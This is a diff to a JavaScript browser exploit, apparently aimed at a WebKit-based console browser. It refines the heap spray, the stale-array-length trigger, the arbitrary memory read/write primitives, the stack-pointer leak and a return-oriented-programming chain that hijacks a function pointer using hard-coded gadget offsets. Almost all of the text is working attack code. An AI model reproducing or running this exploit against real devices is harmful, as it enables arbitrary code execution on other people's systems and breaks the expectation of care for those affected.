@@ -50,9 +50,9 @@ function pressureGC() {
 		pressure[i] = 0;
 }
 
-var bufs;
+var bufs, numbufs = 1500000;
 function allocBuffers() {
-	bufs = new Array(1500000);
+	bufs = new Array(numbufs);
 	log('Making ' + bufs.length + ' buffers');
 	for(var i = 0; i < bufs.length; ++i) {
 		bufs[i] = new Uint32Array(rwbuf);
@@ -69,7 +69,7 @@ function paddr(lo, hi) {
 	return '0x' + shi + slo;
 }
 
-function doExploit(buf, stale, temp) {
+function doExploit(bufi, buf, stale, temp) {
 	function dump(name, buf, count) {
 		for(var j = 0; j < count; ++j)
 			log(name + '[' + j + '] == 0x' + buf[j].toString(16));
@@ -158,6 +158,15 @@ function doExploit(buf, stale, temp) {
 		return read8(leakaddr, 4);
 	}
 
+	log('Clearing useless buffers');
+	// Give ourselves a 'buffer' of 100 buffers around the one we know we hit, for safety
+	var cleared = 0;
+	for(var i = 0; i < numbufs; ++i) {
+		if(!((i <= bufi && i + 50 >= bufi) || (i >= bufi && i - 50 < bufi)))
+			bufs[i] = 0 * (cleared++);
+	}
+	log('Done with cleanup.  Cleared ' + cleared + ' buffers');
+
 	function getBase() {
 		var tlfuncaddr = getAddr(func);
 		funcaddr = read8(tlfuncaddr, 6);
@@ -167,18 +176,6 @@ function doExploit(buf, stale, temp) {
 		log('First module ... ' + paddr(baseaddr));
 
 		return baseaddr;
-	}
-
-	function dumpNRO() {
-		var addr = getBase();
-		log('Reading from ' + paddr(addr));
-
-		addr = add2(addr, readoff);
-		buf[4] = addr[0];
-		buf[5] = addr[1];
-		buf[6] = 0xFFFFFFFF;
-
-		memdump(addr[0], addr[1], temp, readsize >> 2);
 	}
 
 	function walkList() {
@@ -247,6 +244,10 @@ function doExploit(buf, stale, temp) {
 
 	var mainaddr = walkList();
 
+	function mref(off) {
+		return add2(mainaddr, off);
+	}
+
 	function getSP() {
 		/*
 			First gadget: hijack X8 via ADRP and known PC, load X2 from known address and branch there
@@ -273,12 +274,16 @@ function doExploit(buf, stale, temp) {
 		log('Function object at ' + paddr(funcaddr));
 		var curptr = read8(funcaddr, 8);
 
+		var fixed = mref(0x91F320);
+		var saved = new Uint32Array(0x1000);
+		for(var i = 0; i < 0x1000; ++i)
+			saved[i] = read4(fixed, i);
 		
-		var retaddr = add2(mainaddr, 0x3E2724); // Second gadget addr
-		var memaddr = add2(mainaddr, 0x91F328);
+		var retaddr = mref(0x3E2724); // Second gadget addr
+		var memaddr = mref(0x91F328);
 		write8(retaddr, memaddr);
-		retaddr = add2(add2(curptr, -funcbase), 0x836050); // Last gadget addr (should just be `blr X27`)
-		memaddr = add2(mainaddr, 0x91F350);
+		retaddr = mref(0x181E9C); // Last gadget addr (should just be `blr X27`)
+		memaddr = mref(0x91F350);
 		write8(retaddr, memaddr);
 
 		// For addresses in webkit_wkc
@@ -290,58 +295,22 @@ function doExploit(buf, stale, temp) {
 		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
 
 		log('Assigned.  Jumping.');
-		var ret = func.apply(0x101);
+		leakee['b'] = func.apply(0x101);
 		log('Jumped back.');
 
-		var sp = getAddr(ret);
+		var sp = read8(leakaddr, 4);
+		write8([0x00000000, 0xffff0000], leakaddr, 4);
 
 		log('Got stack pointer: ' + paddr(sp));
 
 		write8(curptr, funcaddr, 8);
 
 		log('Restored original function pointer.');
+		for(var i = 0; i < 0x1000; ++i)
+			write4(saved[i], fixed, i);
+		log('Restored data page.');
 
 		return sp;
-	}
-
-	function testarg() {
-		var test = 0x39FEEC; // First gadget addr
-		var jaddr = add2(mainaddr, test);
-		log('New jump at ' + paddr(jaddr));
-		log('Assigning function pointer');
-
-		log('Function object at ' + paddr(funcaddr));
-		var curptr = read8(funcaddr, 8);
-
-		var wkcaddr = add2(curptr, -funcbase);
-
-		var retaddr = add2(wkcaddr, 0x16EA88); // Second gadget addr
-		var memaddr = add2(mainaddr, 0x91F320 + 0x8);
-		write8(retaddr, memaddr);
-		retaddr = add2(wkcaddr, 0xBDD8AC); // Third gadget addr
-		memaddr = add2(mainaddr, 0x91F320 + 0x10);
-		write8(retaddr, memaddr);
-		retaddr = add2(wkcaddr, 0x836050); // Last gadget addr (should just be `blr X27`)
-		memaddr = add2(mainaddr, 0x91F320 + 0x568);
-		write8(retaddr, memaddr);
-
-		// For addresses in webkit_wkc
-		//write8(add2(add2(curptr, -funcbase), 0x836050), funcaddr, 8);
-
-		// For addresses in app
-		write8(jaddr, funcaddr, 8);
-
-		log('Patched function address from ' + paddr(curptr) + ' to ' + paddr(read8(funcaddr, 8)));
-
-		log('Assigned.  Jumping.');
-		var ret = func.apply(0x101);
-		log('Jumped back.');
-
-		log('Output addr: ' + paddr(getAddr(ret)));
-
-		write8(curptr, funcaddr, 8);
-
-		log('Restored original function pointer.');
 	}
 
 	var allocated = {};
@@ -366,8 +335,6 @@ function doExploit(buf, stale, temp) {
             args = [];
         } 
 		var sp = getSP();
-
-		function mref(off) { return add2(mainaddr, off); }
 
 		log('Starting holy rop');
 		var jaddr = mref(0x39FEEC); // First gadget addr
@@ -492,8 +459,11 @@ function doExploit(buf, stale, temp) {
 		sp = add2(sp, 0x8000);
 
 		log('Assigned.  Jumping.');
-		var ret = getAddr(func.apply(0x101));
+		leakee['b'] = func.apply(0x101);
 		log('Jumped back.');
+
+		var ret = read8(leakaddr, 4);
+		write8([0x00000000, 0xffff0000], leakaddr, 4);
 
 		write8(curptr, funcaddr, 8);
 
@@ -531,11 +501,13 @@ function doExploit(buf, stale, temp) {
 		write4(0, strbuf, str.length >> 2);
 	}
 
-
 	holyrop(strlen_fptr, [strbuf]);
 	free(strbuf);
+
 	return;
 }
+
+var stale;
 
 function doItAll() {
 	log('Starting');
@@ -576,7 +548,7 @@ function doItAll() {
 	};
 
 	var target = [];
-	var stale = 0;
+	stale = 0;
 	var before_len = arr.length; 
 	Object.defineProperties(target, props);
 	stale = target.stale;
@@ -590,11 +562,11 @@ function doItAll() {
 
 	log('Triggered.  New length: 0x' + stale.length.toString(16));
 
-	/*if(stale.length != 0x1001) {
-		log('Bailing.');
+	if(stale.length < 2 || stale.length == 0x1003) {
+		log('Bad length;');
 		location.reload();
 		return;
-	}*/
+	}
 
 	var temp = new Uint32Array(0x10);
 	temp[0] = 0x41414141;
@@ -606,7 +578,8 @@ function doItAll() {
 	for(var i = 0; i < bufs.length; ++i) {
 		if(bufs[i][0] != 0x41424344) {
 			found = true;
-			doExploit(bufs[i], stale, temp);
+
+			doExploit(i, bufs[i], stale, temp);
 			break;
 		}
 	}
@@ -618,4 +591,3 @@ function doItAll() {
 
 	log('Done');
 }
-
